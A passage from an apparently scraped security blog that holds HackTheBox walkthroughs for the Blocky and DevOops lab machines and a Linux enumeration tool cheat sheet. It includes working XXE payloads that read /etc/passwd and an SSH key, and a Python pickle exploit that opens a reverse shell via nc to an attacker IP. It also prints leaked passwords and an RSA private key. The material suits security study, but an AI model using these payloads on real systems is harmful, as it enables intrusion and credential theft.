ssh-hostkey: | 2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA) | 256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA) |_ 256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519) 80&#x2F;tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: WordPress 4.8 |_http-server-header: Apache&#x2F;2.4.18 (Ubuntu) |_http-title: BlockyCraft – Under Construction! 8192&#x2F;tcp closed sophos Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; . Nmap done: 1 IP address (1 host up) scanned in 19.32 seconds dirsearch scan 123456789101112131415161718192021222324252627$ .&#x2F;dirsearch.py -u 10.10.10.37 -e * [08:44:06] 301 - 0B - &#x2F;index.php -&gt; http:&#x2F;&#x2F;10.10.10.37&#x2F; [08:44:09] 301 - 315B - &#x2F;javascript -&gt; http:&#x2F;&#x2F;10.10.10.37&#x2F;javascript&#x2F;[08:44:13] 200 - 19KB - &#x2F;license.txt [08:44:37] 301 - 315B - &#x2F;phpmyadmin -&gt; http:&#x2F;&#x2F;10.10.10.37&#x2F;phpmyadmin&#x2F;[08:44:41] 200 - 10KB - &#x2F;phpmyadmin&#x2F; [08:44:42] 301 - 312B - &#x2F;plugins -&gt; http:&#x2F;&#x2F;10.10.10.37&#x2F;plugins&#x2F;[08:44:46] 200 - 7KB - &#x2F;readme.html [08:44:52] 403 - 299B - &#x2F;server-status [08:44:52] 403 - 300B - &#x2F;server-status&#x2F;[08:45:21] 200 - 380B - &#x2F;wiki&#x2F;[08:45:21] 301 - 313B - &#x2F;wp-admin -&gt; http:&#x2F;&#x2F;10.10.10.37&#x2F;wp-admin&#x2F;[08:45:21] 301 - 309B - &#x2F;wiki -&gt; http:&#x2F;&#x2F;10.10.10.37&#x2F;wiki&#x2F;[08:45:21] 302 - 0B - &#x2F;wp-admin&#x2F; -&gt; http:&#x2F;&#x2F;10.10.10.37&#x2F;wp-login.php?redirect_to&#x3D;http%3A%2F%2F10.10.10.37%2Fwp-admin%2F&amp;reauth&#x3D;1[08:45:22] 200 - 1KB - &#x2F;wp-admin&#x2F;install.php[08:45:22] 500 - 4KB - &#x2F;wp-admin&#x2F;setup-config.php[08:45:22] 200 - 0B - &#x2F;wp-content&#x2F;[08:45:22] 301 - 315B - &#x2F;wp-content -&gt; http:&#x2F;&#x2F;10.10.10.37&#x2F;wp-content&#x2F;[08:45:23] 200 - 69B - &#x2F;wp-content&#x2F;plugins&#x2F;akismet&#x2F;akismet.php[08:45:23] 200 - 965B - &#x2F;wp-content&#x2F;uploads&#x2F;[08:45:23] 301 - 316B - &#x2F;wp-includes -&gt; http:&#x2F;&#x2F;10.10.10.37&#x2F;wp-includes&#x2F;[08:45:23] 500 - 0B - &#x2F;wp-includes&#x2F;rss-functions.php[08:45:23] 200 - 2KB - &#x2F;wp-login.php[08:45:23] 200 - 40KB - &#x2F;wp-includes&#x2F;[08:45:24] 405 - 42B - &#x2F;xmlrpc.php Task Completed wpscan 123456789101112131415161718[i] User(s) Identified:[+] notch | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http:&#x2F;&#x2F;10.10.10.37&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection)[+] Notch | Found By: Rss Generator (Passive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] WPVulnDB API OK | Plan: free | Requests Done (during the scan): 3 | Requests Remaining: 47 Getting User Access Visit http://10.10.10.37/plugin Download and extract BlockyCore.jar, once the BlockCore.class is extracted we need to do to print out it’s contents is to use the jad command. 12345678910111213141516171819202122232425262728293031323334353637383940$ jad BlockyCore.classParsing BlockyCore.class...The class file version is 52.0 (only 45.3, 46.0 and 47.0 are supported)Generating BlockyCore.jad$ cat BlockyCore.jad&#x2F;&#x2F; Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.&#x2F;&#x2F; Jad home page: http:&#x2F;&#x2F;www.geocities.com&#x2F;kpdus&#x2F;jad.html&#x2F;&#x2F; Decompiler options: packimports(3)&#x2F;&#x2F; Source File Name: BlockyCore.java package com.myfirstplugin;public class BlockyCore&#123; public BlockyCore() &#123; sqlHost &#x3D; &quot;localhost&quot;; sqlUser &#x3D; &quot;root&quot;; sqlPass &#x3D; &quot;8YsqfCTnvxAUeduzjNSXe22&quot;; &#125; public void onServerStart() &#123; &#125; public void onServerStop() &#123; &#125; public void onPlayerJoin() &#123; sendMessage(&quot;TODO get username&quot;, &quot;Welcome to the BlockyCraft!!!!!!!&quot;); &#125; public void sendMessage(String s, String s1) &#123; &#125; public String sqlHost; public String sqlUser; public String sqlPass;&#125; Get the credentials: notch : 8YsqfCTnvxAUeduzjNSXe22 SSH with notch 123456789101112131415161718$ ssh notch@10.10.10.37notch@10.10.10.37&#39;s password: Welcome to Ubuntu 16.04.2 LTS (GNU&#x2F;Linux 4.4.0-62-generic x86_64) * Documentation: https:&#x2F;&#x2F;help.ubuntu.com * Management: https:&#x2F;&#x2F;landscape.canonical.com * Support: https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage7 packages can be updated.7 updates are security updates.Last login: Tue Jul 25 11:14:53 2017 from 10.10.14.230notch@Blocky:~$ iduid&#x3D;1000(notch) gid&#x3D;1000(notch) groups&#x3D;1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)notch@Blocky:~$ lsminecraft user.txtnotch@Blocky:~$ cat user.txt 59fee0977fb60b8a0bc6e41e751f3cd5 Getting Root Access 1234567891011121314notch@Blocky:~$ cat .bash_history sudo sucat .bash_history echo &quot;&quot; &gt; .bash_history exitpoweroffsudo poweroffnotch@Blocky:~$ sudo -l[sudo] password for notch: Matching Defaults entries for notch on Blocky: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser notch may run the following commands on Blocky: (ALL : ALL) ALL Get root flag 1234notch@Blocky:~$ cat &#x2F;root&#x2F;root.txtcat: &#x2F;root&#x2F;root.txt: Permission deniednotch@Blocky:~$ sudo suroot@Blocky:&#x2F;home&#x2F;notch# cat &#x2F;root&#x2F;root.txt 0x04 Conclusion 0x05 Reference https://ech1.netlify.com/htb/easy/1","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"靶机/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"HTB::DevOops Walkthrough","date":"2020-03-30T07:19:41.000Z","path":"Target_drone/HackTheBox/11.HTB-DevOops-walkthrough/","text":"HTB::DevOops Walkthrough 0x01 Info Card 0x02 Preliminary Python unserialize https://r1dd1er.top/2019/05/21/python安全之反序列化/ http://bendawang.site/2018/03/01/关于Python-sec的一些总结/ https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之Python 反序列化漏洞/ http://www.code2sec.com/python-picklede-ren-yi-dai-ma-zhi-xing-lou-dong-shi-jian-he-payloadgou-zao.html 靶场：https://github.com/vulhub/vulhub/tree/master/python/unpickle XXE Injection https://ca0y1h.top/Web_security/basic_learning/20.xxe漏洞利用/ 0x03 Tools and Tips nmap dirsearch wfuzz Python pickle unserialize XXE read files Git 0x04 Pentesting Initial Enumeration nmap scan 1234567891011121314151617# Nmap 7.80 scan initiated Tue Mar 24 09:04:48 2020 as: nmap -sC -sV -oN ippsec_scan.txt 10.10.10.91Nmap scan report for 10.10.10.91Host is up (0.32s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)| 256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)|_ 256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)5000&#x2F;tcp open http Gunicorn 19.7.1|_http-server-header: gunicorn&#x2F;19.7.1|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;utf-8).Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernelService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .# Nmap done at Tue Mar 24 09:05:52 2020 -- 1 IP address (1 host up) scanned in 64.19 seconds 5000 port run as Python web server gunicorn，dirsearch and wfuzz scan directory 12345678$ .&#x2F;dirsearch -u http:&#x2F;&#x2F;10.10.10.91:5000&#x2F; -e *Target: http:&#x2F;&#x2F;10.10.10.91:5000&#x2F;[02:21:18] Starting: [02:24:47] 200 - 533KB - &#x2F;feed[02:27:26] 200 - 347B - &#x2F;uploadTask Completed 12345$ wfuzz --hc&#x3D;404 -z file,&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt http:&#x2F;&#x2F;10.10.10.91:5000&#x2F;FUZZ...000000126: 200 1815 L 24122 517022 Ch &quot;feed&quot;000000366: 200 0 L 39 W 347 Ch &quot;upload&quot;000019602: 405 4 L 23 W 178 Ch &quot;newpost&quot; Getting User Flag visit the homepage 1234567891011121314&lt;html&gt; &lt;body&gt; Under construction!&lt;br&gt; &lt;p&gt; This is feed.py, which will become the MVP for Blogfeeder application. &lt;/p&gt; &lt;p&gt; TODO: replace this with the proper feed from the dev.solita.fi backend. &lt;/p&gt; &lt;p&gt; &lt;img src=&quot;/feed&quot; align=&quot;center&quot; width=&quot;60%&quot; height=&quot;60%&quot;&gt; &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; visit http://10.10.10.91:5000/upload, it should upload xml file including Author, Subject, Content elements. Try to upload a normal xml file. 123456&lt;?xml version=&quot;1.0&quot;?&gt;&lt;body&gt; &lt;Author&gt;author&lt;/Author&gt; &lt;Subject&gt;subject&lt;/Subject&gt; &lt;Content&gt;content&lt;/Content&gt;&lt;/body&gt; return a comfirmation and file path. 1PROCESSED BLOGPOST: Author: author Subject: subject Content: content URL for later reference: &#x2F;uploads&#x2F;test.xml File path: &#x2F;home&#x2F;roosa&#x2F;deploy&#x2F;src now, I try to upload an evil xml file that can read files 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE Author [&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;Author&gt; &lt;Subject&gt;ca01h&lt;/Subject&gt; &lt;Content&gt;njupt&lt;/Content&gt; &amp;file;&lt;/Author&gt; Visit http://10.10.10.91:5000/uploads/evil.xml, success to return /etc/passwd file. 123PROCESSED BLOGPOST: Author: njupt root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin......roosa:x:1002:1002:,,,:&#x2F;home&#x2F;roosa:&#x2F;bin&#x2F;bash sshd:x:121:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin blogfeed:x:1003:1003:,,,:&#x2F;home&#x2F;blogfeed:&#x2F;bin&#x2F;false Subject: ca01h Content: njupt URL for later reference: &#x2F;uploads&#x2F;evil.xml File path: &#x2F;home&#x2F;roosa&#x2F;deploy&#x2F;src 结合首页的feed.py提示，以及上传成功后的信息/home/roosa/deploy/src，猜测网站的源码应该是放在这个目录，然后我们尝试访问/home/roosa/deploy/src/feed.py 1234567891011121314151617181920212223242526def uploaded_file(filename): return send_from_directory(Config.UPLOAD_FOLDER, filename) @app.route(&quot;&#x2F;&quot;) def xss(): return template(&#39;index.html&#39;) @app.route(&quot;&#x2F;feed&quot;) def fakefeed(): return send_from_directory(&quot;.&quot;,&quot;devsolita-snapshot.png&quot;) @app.route(&quot;&#x2F;newpost&quot;, methods&#x3D;[&quot;POST&quot;]) def newpost(): # TODO: proper save to database, this is for testing purposes right now picklestr &#x3D; base64.urlsafe_b64decode(request.data) # return picklestr postObj &#x3D; pickle.loads(picklestr) return &quot;POST RECEIVED: &quot; + postObj[&#39;Subject&#39;] ## TODO: VERY important! DISABLED THIS IN PRODUCTION #app &#x3D; DebuggedApplication(app, evalex&#x3D;True, console_path&#x3D;&#39;&#x2F;debugconsole&#39;) # TODO: Replace run-gunicorn.sh with real Linux service script #app &#x3D; DebuggedApplication(app, evalex&#x3D;True, console_path&#x3D;&#39;&#x2F;debugconsole&#39;) if __name__ &#x3D;&#x3D; &quot;__main__&quot;: app.run(host&#x3D;&#39;0.0.0,0&#39;, Debug&#x3D;True) 有了前面Python反序列化的基础，就很容易看出来postObj = pickle.loads(picklestr) 这条语句存在反序列化漏洞。写一个Python脚本反弹shell： 12345678910111213141516171819import pickleimport requestsimport osimport base64url = &quot;http://10.10.10.91:5000/newpost&quot;headers = &#123;&quot;Content-Type&quot;: &quot;text/plain&quot;&#125;code = &#x27;rm /tmp/x;mkfifo /tmp/x;cat /tmp/x|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.99 9000 &gt;/tmp/x&#x27;class Devoops(object): def __reduce__(self): return (os.system, (code,))payload = base64.urlsafe_b64encode(pickle.dumps(Devoops()))print(payload)r = requests.post(url=url, data=payload, headers=headers, allow_redirects=False)print(r.text) 一定要用Python2执行脚本，因为py2和py3序列化后的结果是完全不一样的 本机监听端口 1234567891011121314$ nc -lvvp 9000 listening on [any] 9000 ...10.10.10.91: inverse host lookup failed: Unknown hostconnect to [10.10.16.99] from (UNKNOWN) [10.10.10.91] 44014&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off$ iduid&#x3D;1002(roosa) gid&#x3D;1002(roosa) groups&#x3D;1002(roosa),4(adm),27(sudo)$ python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;roosa@gitter:~&#x2F;deploy&#x2F;src$ ididuid&#x3D;1002(roosa) gid&#x3D;1002(roosa) groups&#x3D;1002(roosa),4(adm),27(sudo)roosa@gitter:~&#x2F;deploy&#x2F;src$ cd &amp;&amp; ls -a user.txtcd &amp;&amp; ls -a user.txtuser.txt 还有一种更简单的方法。对于目标靶机只有只读的访问权限，这篇文章提示了我们应查找的文件。 在这种情况下，我们可以访问roosa主目录的id_rsa文件： 1234567&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE Author [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;home&#x2F;roosa&#x2F;.ssh&#x2F;id_rsa&quot;&gt;]&gt;&lt;Author&gt; &lt;Subject&gt;ca01h&lt;&#x2F;Subject&gt; &lt;Content&gt;njupt&lt;&#x2F;Content&gt; &amp;file;&lt;&#x2F;Author&gt; 获取后保存到本机，用ssh登录靶机： 12345678910111213141516171819202122232425262728# kali @ kali in ~&#x2F;HackTheBox&#x2F;DevOops [2:01:04] $ chmod 600 id_rsa # kali @ kali in ~&#x2F;HackTheBox&#x2F;DevOops [2:01:19] $ ssh -i id_rsa roosa@10.10.10.91The authenticity of host &#39;10.10.10.91 (10.10.10.91)&#39; can&#39;t be established.ECDSA key fingerprint is SHA256:hbD2D4PdnIVpAFHV8sSAbtM0IlTAIpYZ&#x2F;nwspIdp4Vg.Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yesWarning: Permanently added &#39;10.10.10.91&#39; (ECDSA) to the list of known hosts.Welcome to Ubuntu 16.04.4 LTS (GNU&#x2F;Linux 4.13.0-37-generic i686) * Documentation: https:&#x2F;&#x2F;help.ubuntu.com * Management: https:&#x2F;&#x2F;landscape.canonical.com * Support: https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage135 packages can be updated.60 updates are security updates.The programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.roosa@gitter:~$ iduid&#x3D;1002(roosa) gid&#x3D;1002(roosa) groups&#x3D;1002(roosa),4(adm),27(sudo) Getting Root Flag 成功登录之后，看一下.bash_history，有几个关键的git命令 1234567891011121314151617...mkdir integration&#x2F;auth_credentials.keynano integration&#x2F;auth_credentials.key&#x2F;ls -altrchmod go-rwx authcredentials.key...rm -Rf resources&#x2F;integration&#x2F;auth_credentials.keymv resources&#x2F;authcredentials.key resources&#x2F;integration&#x2F;git add resources&#x2F;integration&#x2F;authcredentials.key git commit -m &#39;add key for feed integration from tnerprise backend&#39;...ssh-keygen...cat kakcp kak resources&#x2F;integration&#x2F;authcredentials.key git add resources&#x2F;integration&#x2F;authcredentials.key git commit -m &#39;reverted accidental commit with proper key&#39; 去git本地仓库看一下提交历史 123456789roosa@gitter:~&#x2F;work&#x2F;blogfeed$ git log --pretty&#x3D;oneline7ff507d029021b0915235ff91e6a74ba33009c6d Use Base64 for pickle feed loading26ae6c8668995b2f09bf9e2809c36b156207bfa8 Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.cec54d8cb6117fd7f164db142f0348a74d3e9a70 Debug support added to make development more agile.ca3e768f2434511e75bd5137593895bd38e1b1c2 Blogfeed app, initial version.dfebfdfd9146c98432d19e3f7d83cc5f3adbfe94 Gunicorn startup script33e87c312c08735a02fa9c796021a4a3023129ad reverted accidental commit with proper keyd387abf63e05c9628a59195cec9311751bdb283f add key for feed integration from tnerprise backend1422e5a04d1b52a44e6dc81023420347e257ee5f Initial commit 回退到第二个commit版本 1234567891011121314151617181920212223242526272829303132333435roosa@gitter:~&#x2F;work&#x2F;blogfeed&#x2F;resources&#x2F;integration$ git reset --hard d387abf63e05c9628a59195cec9311751bdb283fHEAD is now at d387abf add key for feed integration from tnerprise backendroosa@gitter:~&#x2F;work&#x2F;blogfeed&#x2F;resources&#x2F;integration$ ls -latotal 12drwxrwxr-x 2 roosa roosa 4096 Mar 30 02:42 .drwxrwxr-x 3 roosa roosa 4096 Mar 30 02:39 ..-rw-rw-r-- 1 roosa roosa 1676 Mar 30 02:42 authcredentials.keyroosa@gitter:~&#x2F;work&#x2F;blogfeed&#x2F;resources&#x2F;integration$ cat authcredentials.key -----BEGIN RSA PRIVATE KEY-----MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU&#x2F;WFI+OPQcpOVj9DdSIEde8PDgpt&#x2F;tBpY7a&#x2F;xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo&#x2F;hfaUUyU5ivr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH&#x2F;NwYW2iovTRKnz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt&#x2F;rEgIVmrb+CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc&#x2F;SHSE0cF9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oHuzjPbIdyEkDc3PAYP+E&#x2F;jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AALgCfN5I+xZGH19V4HPMCrK6PzskYII3&#x2F;i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeDk2X0256DbRv&#x2F;ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSyNnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNMHSRik2J&#x2F;7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK&#x2F;oLc0RBGLEKU6HtUuKFvlXdJ22S4&#x2F;rQb0RiDcU&#x2F;wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHGjwrjv&#x2F;loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp&#x2F;QYtjn&#x2F;ltojR16JNTKqiW7vSqlsZnT9jR2syvuhhVz4Ei9yA&#x2F;VYZG2uiCpK0CgYA&#x2F;UOhz+LYu&#x2F;MsGoh0+yNXjGx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvSiD6fE+5&#x2F;i&#x2F;rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo&#x2F;PcFlfXQhrERxRXJQKPHdJP7VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp&#x2F;INRXS8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6md&#x2F;EqUtm84&#x2F;VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ieLWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwczoAvexd1JRMkbC7YOgrzZ9iOxHP+mg&#x2F;LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLwLS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE&#x3D;-----END RSA PRIVATE KEY----- 拷贝到本机保存，再用ssh登录靶机 123456789101112131415161718$ chmod 600 root_id_rsa # kali @ kali in ~&#x2F;HackTheBox&#x2F;DevOops [2:44:48] $ ssh -i root_id_rsa root@10.10.10.91Welcome to Ubuntu 16.04.4 LTS (GNU&#x2F;Linux 4.13.0-37-generic i686) * Documentation: https:&#x2F;&#x2F;help.ubuntu.com * Management: https:&#x2F;&#x2F;landscape.canonical.com * Support: https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage135 packages can be updated.60 updates are security updates.Last login: Mon Mar 26 06:23:48 2018 from 192.168.57.1root@gitter:~# iduid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)root@gitter:~# cat root.txt d4fe1e7f7187407eebdd3209cb1ac7b3 0x05 Reference https://epi052.gitlab.io/notes-to-self/blog/2018-10-11-hack-the-box-devoops/","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"靶机/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"Linux-Enumeration","date":"2020-03-26T12:26:01.000Z","path":"Other/6.Linux-Enumeration/","text":"更新中… Linux Enumeration 信息搜集 Nmap 使用手册：https://www.stationx.net/nmap-cheat-sheet/ 常用参数 Target Selection: nmap 192.168.0.1(scanning a single ip address) nmap ca0y1h.top(scanning an url directly) nmap 192.168.0.0/24(scan a range of IPs (192.168.0.0-255)) nmap -iL list-of-ips.txt(scan a list of ip) Port Selection: nmap 127.0.0.1 -p 22(scanning the default SSH port) nmap 127.0.0.1 -p 1-1024(scanning ports 1 2 3…1024) nmap 127.0.0.1 -F(scanning the most 100 common ports (80,22,21,443,etc)) nmap 127.0.0.1 -F --top-ports 30000 nmap 127.0.0.1 -p-(all ports) Port Scan Types: nmap 127.0.0.1 -sT (using TCP (used by default)) nmap 127.0.0.1 -sS (TCP SYN scan) nmap 127.0.0.1 -sU (UDP ports) nmap 127.0.0.1 -Pn -F (skip the initial ping step) Service &amp; OS Detection nmap 127.0.0.1 -A(detect OS &amp; services) nmap 127.0.0.1 -sV(enumerate versions) nmap 127.0.0.1 -sC(using default scripts) nmap 127.0.0.1 -sV --version-intensity 5(Aggressive service detection) nmap 127.0.0.1 -sV --version-intensity 0(Light banner grabbing detection) nmap 127.0.0.1 -T0(paranoid detection evasion) nmap 127.0.0.1 -T1(sneaky detection evasion) nmap 127.0.0.1 -T2(polite (slows down scan, less bandwidth &amp; less target ressources)) nmap 127.0.0.1 -T3(default speed) nmap 127.0.0.1 -T4(Aggressive (fast &amp; reliable network)) nmap 127.0.0.1 -T5(Insane speeds (assumes low ping and high bandwidth)) nmap 127.0.0.1 --host-timeout 1h 2m 3s(sets timeout to 1hr2min3sec) nmap 127.0.0.1 --min-parallelism 10(minimal probe parallelization) nmap 127.0.0.1 --max-parallelism 50(maximal ^) nmap 127.0.0.1 --max-retries 3 nmap 127.0.0.1 --min-rate (send packets at least _ per second) Python Script Scan 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!&#x2F;usr&#x2F;bin&#x2F;python3import subprocessip &#x3D; input(&quot;[+]Target IP: &quot;)ippsec &#x3D; &quot;ippsec_scan.txt&quot;service &#x3D; &quot;service_scan.txt&quot;script &#x3D; &quot;script_scan.txt&quot;all_tcp &#x3D; &quot;all_tcp_scan.txt&quot;all_udp &#x3D; &quot;all_tcp_scan.txt&quot;def ippsec_scan(ip): print(&quot;[!] Starting ippsec_scan &quot;) subprocess.run([&quot;nmap&quot;, &quot;-sC&quot;, &quot;-sV&quot;, &quot;-oN&quot;, ippsec, ip]) print(&quot;[+] Done &quot;)def service_scan(ip): print(&quot;[!] Starting service_scan &quot;) subprocess.run([&quot;nmap&quot;, &quot;-A&quot;, &quot;-p-&quot;, &quot;-oN&quot;, service, ip]) print(&quot;[+] Done &quot;)def script_scan(ip): print(&quot;[!] Starting script_scan &quot;) subprocess.run([&quot;nmap&quot;, &quot;--script&quot;, &quot;discovery, safe, vuln&quot;, &quot;-oN&quot;, script, ip]) print(&quot;[+] Done &quot;)def alltcp_scan(ip): print(&quot;[!] Starting all_tcp_scan &quot;) subprocess.run([&quot;nmap&quot;, &quot;-p-&quot;, &quot;-oN&quot;, all_tcp, ip]) print(&quot;[+] Done &quot;)def alludp_scan(ip): print(&quot;[!] Starting all_udp_scan &quot;) subprocess.run([&quot;nmap&quot;, &quot;-p-&quot;, &quot;-sU&quot;, &quot;-oN&quot;, all_udp, ip]) print(&quot;[+] Done &quot;)if __name__ &#x3D;&#x3D; &#39;__main__&#39;: ippsec_scan(ip) service_scan(ip) script_scan(ip) alltcp_scan(ip) alludp_scan(ip) Netdiscover Nikto 项目地址：https://github.com/sullo/nikto 工具介绍：perl语言开发的开源WEB安全扫描器；识别网站软件版本；搜索存在安全隐患的文件；检查服务器配置漏洞；检查WEB Application层面的安全隐患；避免404误判依据响应文件内容判断，不同扩展名的文件404响应内容不同。 常用命令： 12345678Nikto -host http:&#x2F;&#x2F;1.1.1.1 #扫描目标：域名方式；Nikto -host http:&#x2F;&#x2F;1.1.1.1 -output #扫描并输出结果Nikto -host 1.1.1.1 -port 80 #扫描目标：ip地址加端口号Nikto -host www.baidu.com -port 443 -ssl #扫描https网站Nikto -host 文件名.txt #批量扫描目标nmap -p80 192.168.1.0&#x2F;24 -oG - | nikto -host - #利用nmap扫描开放80端口的IP段并且oG（nmap结果输出并整理）通过管道的方式“|”用nikto进行扫描nikto -host 192.168.0.1 -useproxy http:&#x2F;&#x2F;localhost:8070 #利用代理进行扫描-vhost #当一个网站存在多个端口时可以使用-vhost遍历所有网站进行扫描或一个ip对应多个网站 GitHack 项目地址：https://github.com/lijiejie/GitHack 工具介绍：GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。 渗透测试人员、攻击者，可以进一步审计代码，挖掘：文件上传，SQL注射等web安全漏洞。 dirb Wfuzz 项目地址：https://wfuzz.readthedocs.io/en/latest/ 工具介绍：wfuzz是一个基于Python的Web爆破程序，它支持多种方法来测试WEB应用的漏洞。你可以审计参数、登录认证、GET/POST方式爆破的表单，并且可以发掘未公开的资源，比如目录、文件和头部之类的。 使用手册：https://www.fuzzer.xyz/2019/03/29/WFUZZ使用教程/ subDomainBrute 项目地址：https://github.com/lijiejie/subDomainsBrute 工具介绍：本工具用于渗透测试目标域名收集。高并发DNS暴力枚举，发现其他工具无法探测到的域名, 如Google，aizhan，fofa。 Pigat 项目地址：https://github.com/teamssix/pigat 工具介绍：被动信息收集聚合工具，该工具通过爬取目标URL在第三方网站比如备案查询网站、子域名查询网站的结果来对目标进行被动信息收集。 密码爆破 hash-identifier 项目地址：https://tools.kali.org/password-attacks/hash-identifier 工具介绍：hash-identifier是一款哈希算法识别工具。通过该工具，用户可以识别哈希值所使用的哈希算法。 hashcat John The Ripper 项目地址：https://www.openwall.com/john/ 使用示例： 1&#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa &gt; id_rsa.hash 1john 